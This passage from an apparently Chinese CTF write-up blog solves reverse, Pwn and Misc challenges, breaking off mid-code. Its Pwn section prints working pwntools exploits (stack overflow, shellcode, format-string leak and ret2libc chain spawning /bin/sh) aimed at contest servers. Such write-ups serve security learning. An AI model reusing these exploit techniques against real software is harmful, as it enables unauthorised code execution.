title="ezzzz"></a>ezzzz</h3><blockquote><p>喝喝茶，做做题 题目附件下载链接:<a href="https://pan.baidu.com/s/1MXYmUTyrwRtfoBntEPiBPg">https://pan.baidu.com/s/1MXYmUTyrwRtfoBntEPiBPg</a> 密码:game</p></blockquote><p>apk文件分析，关键逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Enc.encrypt(<span class="built_in">this</span>.et.getText().toString()).equals(getResources().getString(R.string.target))) &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Wow!You are right!!!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Emmmmm……wrong????&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密逻辑在 <code>Enc.encrypt()</code>，发现是带符号的xtea加密，提取密文：</p><p><code>target=f1f186b25a96c782e6c63a0b70b61b5ced6bf84889700d6b09381b5ccb2f24fab1c79e796d822d9cdcc55f760f780e750d65c4afb89084a9e978c3827a8dd81091f28df3a84dbacab4d75f75f19af8e5b90f80fcfc10a5c3d20679fb2bc734c8ccb31c921ac52ad3e7f922b72e24d923fb4ce9f53548a9e571ebc25adf38862e10059186327509463dd4d54c905abc36c26d5312d2cd42c0772d99e50cd4c4665c3178d63a7ffe71ada251c070568d5a5798c2921ec0f7fc3ae9d8418460762930ca6a2dccef51d2a1a8085491b0f82d686ca34774c52d0f0f26449fc28d362c86f3311b8adc4fb1a4497e34e0f0915d</code></p><p>用c写解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="built_in">map</span>[] = &#123;<span class="number">4059137714</span>, <span class="number">1519830914</span>, <span class="number">3871750667</span>, <span class="number">1890982748</span>, <span class="number">3983276104</span>, <span class="number">2305822059</span>, <span class="number">154671964</span>, <span class="number">3408864506</span>, <span class="number">2982649465</span>, <span class="number">1837247900</span>, <span class="number">3703922550</span>, <span class="number">259526261</span>, <span class="number">224773295</span>, <span class="number">3096478889</span>, <span class="number">3917005698</span>, <span class="number">2056116240</span>, <span class="number">2448592371</span>, <span class="number">2823666378</span>, <span class="number">3034013557</span>, <span class="number">4053465317</span>, <span class="number">3104801020</span>, <span class="number">4228949443</span>, <span class="number">3523639803</span>, <span class="number">734475464</span>, <span class="number">3434290322</span>, <span class="number">449129171</span>, <span class="number">3891864247</span>, <span class="number">774166819</span>, <span class="number">4216121845</span>, <span class="number">893954533</span>, <span class="number">1911276122</span>, <span class="number">3745023534</span>, <span class="number">268800390</span>, <span class="number">846530886</span>, <span class="number">1037358412</span>, <span class="number">2421865526</span>, <span class="number">3261944594</span>, <span class="number">3536667328</span>, <span class="number">1999477221</span>, <span class="number">215270502</span>, <span class="number">1546746070</span>, <span class="number">981466737</span>, <span class="number">2913096128</span>, <span class="number">1884720474</span>, <span class="number">1469629074</span>, <span class="number">515962876</span>, <span class="number">988403777</span>, <span class="number">2220914217</span>, <span class="number">818571821</span>, <span class="number">3438236114</span>, <span class="number">2712143956</span>, <span class="number">2444294189</span>, <span class="number">1751950151</span>, <span class="number">1959079183</span>, <span class="number">254166175</span>, <span class="number">3264034348</span>, <span class="number">2264084763</span>, <span class="number">2329694129</span>, <span class="number">2756279860</span>, <span class="number">3773862237</span>&#125;;</span><br><span class="line"><span class="type">int</span> key[] = &#123;<span class="number">71</span>, <span class="number">69</span>, <span class="number">69</span>, <span class="number">75</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">int</span>* v,<span class="type">int</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; ++i)</span><br><span class="line">        sum += <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">31</span>; j&gt;=<span class="number">0</span>; --j) &#123;</span><br><span class="line">        v[<span class="number">1</span>] -= (((v[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) ^ (v[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)) + v[<span class="number">0</span>]) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (sum+j);</span><br><span class="line">        sum -= <span class="number">0x9E3779B9</span>;</span><br><span class="line">        v[<span class="number">0</span>] -= (((v[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) ^ (v[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)) + v[<span class="number">1</span>]) ^ (sum + key[sum &amp; <span class="number">3</span>]) ^ (sum+j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">60</span>; i+=<span class="number">2</span>)</span><br><span class="line">        decode(&amp;<span class="built_in">map</span>[i],key);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">60</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,<span class="built_in">map</span>[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SYC&#123;g0od_j0b_wweLCoMeToooSSSyC_zz_1_et3start_yoUr_j0urney!!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="你会栈溢出吗"><a href="#你会栈溢出吗" class="headerlink" title="你会栈溢出吗"></a>你会栈溢出吗</h3><blockquote><p>超级简单的题目</p></blockquote><p>ret2text。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">34467</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">key=<span class="number">0x40073D</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(key)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="简单的签到"><a href="#简单的签到" class="headerlink" title="简单的签到"></a>简单的签到</h3><blockquote><p>作为大学生，一定要有快速口算的能力！</p></blockquote><p>pwntools运用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">20040</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;challenge.\n&#x27;</span>)</span><br><span class="line">r.sendline()</span><br><span class="line">ans=<span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;= &#x27;</span>)[:-<span class="number">2</span>])</span><br><span class="line">r.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><blockquote><p>不能更加简单的pwn_shellcode题,什么你不知道shellcode？快去学吧</p></blockquote><p>ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">43003</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;shellcode?\n&#x27;</span>)</span><br><span class="line">pl=asm(shellcraft.sh())</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">gift=<span class="number">0x401256</span></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">8</span>)+p64(gift)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="00000"><a href="#00000" class="headerlink" title="00000"></a>00000</h3><blockquote><p>你说让我输密码？有没有什么简单的办法呢？</p></blockquote><p>利用函数特性逐位爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">burp</span>():</span><br><span class="line">    r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">15085</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Enter the password: &#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    x=r.recvline()</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;wrong&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">        r.close()</span><br><span class="line">        burp()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.interactive()</span><br><span class="line"></span><br><span class="line">burp()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="买黑吗喽了吗"><a href="#买黑吗喽了吗" class="headerlink" title="买黑吗喽了吗"></a>买黑吗喽了吗</h3><blockquote><p>黑吗喽真好玩!</p></blockquote><p>balance负溢出，转无符号&gt;0x100，进入修改str的2字节，改为 <code>%p</code>，可以泄露出balance地址。</p><p>求pie基址，再ret2libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">33352</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./买黑马喽了么/syscall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./买黑马喽了么/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;%p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">balance_addr=<span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">pie_base=balance_addr-<span class="number">0x4090</span></span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;pie_base:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">pop_rdi=pie_base+<span class="number">0x11f1</span></span><br><span class="line">ret=pie_base+<span class="number">0x101a</span></span><br><span class="line">puts_plt=pie_base+elf.plt.puts</span><br><span class="line">puts_got=pie_base+elf.got.puts</span><br><span class="line">read_back=pie_base+<span class="number">0x14c0</span></span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>),pop_rdi,puts_got,puts_plt,read_back])</span><br><span class="line">r.send(pl)</span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;puts_addr:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;libc_base:x&#125;</span>&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.sym.system</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;feedback:\n&#x27;</span>)</span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>),ret,pop_rdi,binsh_addr,system_addr,read_back])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl)%<span class="number">16</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="over-flow"><a href="#over-flow" class="headerlink" title="over_flow??"></a>over_flow??</h3><blockquote><p>stack overflow??</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">16674</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00\x3b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a>ez_pcap_1</h3><blockquote><p>黑客通过外网getshell进入内网，在域渗透横向文件传输时传送了一个危险文件，你能找到这个危险文件吗？</p></blockquote><p>010editor16进制查看下搜索 <code>SYC</code>，flag：<code>SYC&#123;smb_pcapng_1s_g00d!&#125;</code>。</p><p>​    </p><h3 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h3><blockquote><p>What is cimbar</p></blockquote><p>参考：<a href="https://www.bilibili.com/read/cv38452107/">https://www.bilibili.com/read/cv38452107/</a></p><p>提取01字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">01010011010110010100001101111011</span><br><span class="line">01000001011011100011000001110100</span><br><span class="line">01101000001100110111001001011111</span><br><span class="line">01000001011011010100000001111010</span><br><span class="line">00110001011011100011100101011111</span><br><span class="line">01010001010100100101111101000011</span><br><span class="line">01101111001101000110010101111101</span><br></pre></td></tr></table></figure><p>二进制转字符得到flag：<code>SYC&#123;An0th3r_Am@z1n9_QR_Co4e&#125;</code>。</p><p>​    </p><h3 id="舔狗的觉醒"><a href="#舔狗的觉醒" class="headerlink" title="舔狗的觉醒"></a>舔狗的觉醒</h3><blockquote><p>听说爱自己的人会有好运哦</p></blockquote><p>爆破解压密码：<code>88888888</code>。</p><p>字节移位输出新zip：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">bytes</span>.fromhex(<span class="built_in">open</span>(<span class="string">&#x27;download.txt&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">g=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> f:</span><br><span class="line">    x=((k&gt;&gt;<span class="number">4</span>)|(k&lt;&lt;<span class="number">4</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    g+=<span class="built_in">bytes</span>([x])</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(g)</span><br></pre></td></tr></table></figure><p>得到一个加密的pdf文件 <code>flag.pdf</code>，使用PasswareKitForensic去掉pdf密码，打开删除图片，得到flag：<code>SYC&#123;YOu_arE_yOuR_Own_hero&#125;</code>。</p><p>​    </p><h3 id="乌龟"><a href="#乌龟" class="headerlink" title="乌龟"></a>乌龟</h3><blockquote><p>starven师傅养了一直会唱歌的乌龟，但是他走丢了，你能帮starven师傅找到他吗(音频文件不只一种用法)</p></blockquote><p>wav文件，sstv音转图：</p><p><code>sstv -d sunset.wav -o result.png</code></p><p>得到的图片里面有 <code>PASS:Be4uti7ulSun5e7</code>。</p><p>wav文件再用deepsound，密码 <code>Be4uti7ulSun5e7</code>，提取出 <code>secret.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">to draw_s  pu setxy -400 200 pd repeat 18 [fd 5 lt 10 wait 2]  repeat 8 [fd 5 lt 10 wait 2]  repeat 21 [fd 5 rt 10 wait 2]  pu setxy -350 200 pd fd 50 wait 5  pu setxy -350 200 pd rt 100 fd 50 wait 5  pu setxy -350 200 pd rt 130 fd 75 wait 5  pu setxy -220 200 pd rt 130 repeat 27 [fd 8 lt 10 wait 2]  pu setxy -430 70 pd lt 130 fd 100 wait 5  pu setxy -480 70 pd lt 90 fd 100 wait 5  pu setxy -420 70 pd fd 100 lt 90 fd 50 lt 90 fd 100 wait 5  pu setxy -350 70 pd rt 90 fd 70 rt 90 fd 50 rt 90 fd 70 wait 5  pu setxy -280 20 pd lt 90 fd 50 rt 90 fd 70 wait 5  pu setxy -250 70 pd rt 180 fd 100 wait 5  pu setxy -200 70 pd rt 90 fd 100 wait 5  pu setxy -130 70 pd lt 130 fd 30 rt 130 fd 110 rt 90 fd 30 wait 5  pu setxy -130 -20 pd lt 180 fd 40 wait 5  pu setxy -70 70 pd fd 70 wait 5  pu setxy -70 70 pd rt 90 fd 50 lt 90 fd 70 wait 5  pu setxy -70 20 pd rt 90 fd 50 lt 90 fd 70 wait 5  pu setxy 20 -30 pd fd 70 wait 5  pu setxy 120 70 pd repeat 18 [fd 5 rt 10 wait 2]  pu setxy 120 70 pd lt 90 fd 100 wait 5  pu setxy 180 70 pd fd 50 lt 90 fd 50 wait 5  pu setxy 230 70 pd rt 90 fd 100 wait 5  pu setxy 260 70 pd lt 90 fd 50 wait 5  pu setxy 285 70 pd rt 90 fd 100 wait 5  pu setxy 260 -30 pd lt 90 fd 50 wait 5  pu setxy 340 70 pd rt 90 fd 100 wait 5  pu setxy 340 70 pd lt 30 fd 115 wait 5  pu setxy 398 -30 pd lt 150 fd 100 wait 5  pu setxy 420 70 pd rt 90 fd 100 wait 5  pu setxy 470 70 pd rt 90 fd 100 wait 5  pu setxy -520 -70 pd lt 90 fd 60 wait 5  pu setxy -490 -70 pd rt 90 fd 100 wait 5  pu setxy -520 -170 pd lt 90 fd 60 wait 5  pu setxy -420 -70 pd rt 90 fd 100 wait 5  pu setxy -420 -70 pd lt 30 fd 115 wait 5  pu setxy -362 -170 pd lt 150 fd 100 wait 5  pu setxy -270 -70 pd lt 90 repeat 27 [fd 8 lt 10 wait 2] lt 180 fd 40 wait 5  pu setxy -230 -120 pd rt 90 fd 30 wait 5 end clearscreen draw_s</span><br></pre></td></tr></table></figure><p>查知为logo编程语言，找个<a href="https://www.calormen.com/jslogo/">在线网站</a>绘制，得到flag：<code>SYC&#123;TU3T1E_P4INTING&#125;</code>。</p><p>​    </p><h3 id="ez-climbstairs"><a href="#ez-climbstairs" class="headerlink" title="ez_climbstairs"></a>ez_climbstairs</h3><blockquote><p>动态规划算法入门题目你知道如何爬楼梯吗？爬对100次就给你flag</p></blockquote><p>爬楼梯经典问题，dp解决，对照测试样例数据，发现是最多可爬3阶。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">climb_stairs_limited_steps</span>(<span class="params">n, k</span>):</span><br><span class="line">    <span class="comment"># 初始化dp数组，dp[i]表示到达第i阶的方法总数</span></span><br><span class="line">    dp = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>  <span class="comment"># 到达第0阶有1种方法（不动）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充dp数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 计算dp[i]为前面最多k阶的方法数之和</span></span><br><span class="line">        dp[i] = <span class="built_in">sum</span>(dp[<span class="built_in">max</span>(<span class="number">0</span>, i - k):i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[n]</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">15734</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;爬上 &#x27;</span>.encode())</span><br><span class="line">    n = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="comment"># 计算爬n阶且每次最多能爬k阶的方法总数</span></span><br><span class="line">    k = <span class="number">3</span>  <span class="comment"># 每次最多爬3阶</span></span><br><span class="line">    res = climb_stairs_limited_steps(n, k)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;：&#x27;</span>.encode(),<span class="built_in">str</span>(res).encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="doSomeMath"><a href="#doSomeMath" class="headerlink" title="doSomeMath"></a>doSomeMath</h3><blockquote><p>lhRaMk7在没通过他的小升初数学考试之后来GSBP老师这里补习，发现他一道题都做不出来，大学生们能帮帮他吗</p></blockquote><p>用 <code>__le__</code> 或 <code>__lt__</code> 生成 True 或 False，等同于1和0。</p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n0 = <span class="string">&#x27;().__lt__(())&#x27;</span></span><br><span class="line">n1 = <span class="string">&#x27;().__le__(())&#x27;</span></span><br><span class="line">n2 = <span class="string">&#x27;().__le__(())+().__le__(())&#x27;</span></span><br><span class="line">n3 = <span class="string">&#x27;().__le__(())+().__le__(())+().__le__(())&#x27;</span></span><br><span class="line">n4 = <span class="string">&#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n5 = <span class="string">&#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(())&#x27;</span></span><br><span class="line">n6 = <span class="string">&#x27;(().__le__(())+().__le__(())+().__le__(()))*2&#x27;</span></span><br><span class="line">n7 = <span class="string">&#x27;().__le__(())+().__le__(())+().__le__(())+(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n8 = <span class="string">&#x27;(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n9 = <span class="string">&#x27;(().__le__(())+().__le__(())+().__le__(()))*(().__le__(())+().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n10 = <span class="string">&#x27;((().__le__(())+().__le__(()))*(().__le__(())+().__le__(()))+().__le__(()))*(().__le__(())+().__le__(()))&#x27;</span></span><br><span class="line">n100 = <span class="string">f&#x27;(<span class="subst">&#123;n10&#125;</span>)*(<span class="subst">&#123;n10&#125;</span>)&#x27;</span></span><br><span class="line">n1000 = <span 